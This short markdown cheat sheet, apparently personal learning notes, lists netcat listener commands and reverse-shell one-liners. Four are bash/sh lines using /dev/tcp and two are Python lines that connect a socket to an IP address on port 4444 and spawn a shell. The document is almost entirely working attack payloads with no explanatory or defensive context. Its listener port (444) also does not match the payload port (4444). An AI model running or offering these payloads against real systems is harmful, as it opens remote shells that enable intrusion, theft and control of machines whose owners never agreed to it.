## Reverse Shell Learing:
### Netcat using:
    Windows: $ ncat -lvnp 444
    Linux: $ nc -lvnp 444
#### Bin & Bash:
```
1. sh -i >& /dev/tcp/0.0.0.0/4444 0>&1
2. /bin/sh -i >& /dev/tcp/0.0.0.0/4444 0>&1
3. bash -i >& /dev/tcp/0.0.0.0/4444 0>&1
4. /bin/bash -i >& /dev/tcp/0.0.0.0/4444 0>&1
```
#### Python:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.0.0.0",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
#### Python3:
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.101",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
